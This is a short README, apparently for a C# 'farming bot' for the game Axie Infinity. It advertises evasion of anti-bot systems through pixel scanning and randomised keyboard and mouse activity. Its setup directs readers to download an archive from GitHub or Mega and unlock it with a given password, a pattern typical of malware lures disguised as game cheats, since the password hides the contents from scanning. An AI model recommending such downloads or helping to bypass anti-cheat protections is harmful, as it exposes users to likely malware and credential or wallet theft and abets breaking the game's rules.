Fully auto play farming script for Axie Infinity. Software uses screen pixels scan for work and random keyboard behaviour patterns to bypass anti-bot systems. Written in C#.

### Features
- No process memory scanning, only pixel scan
- Supported PVP and PVE gameplay modes
- Random skill cast and delay
- Random keyboard and mouse activity

### Setup
- [Download](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) repository and extract files with password `bGMGOmUsgm` ([Github](https://github.com/psichedel/Axie-Farm-bot/archive/refs/heads/main.zip) | [Mega](https://mega.nz/file/ut9GiIoB#xEOEZT8qoUAaNNnuywRK1K2HiJe1HZmLEeSoqvEmpRc))
- Launch Mavis and Axie in full-screen mode
- Launch bot and select mode you need

### Warning
I not recommend you to use script more than 3 hours a day. Note that Axie Infinity updates are very frequent and software might be outdated. In this case you receive warn message from bot and you should not use bot untill next update.
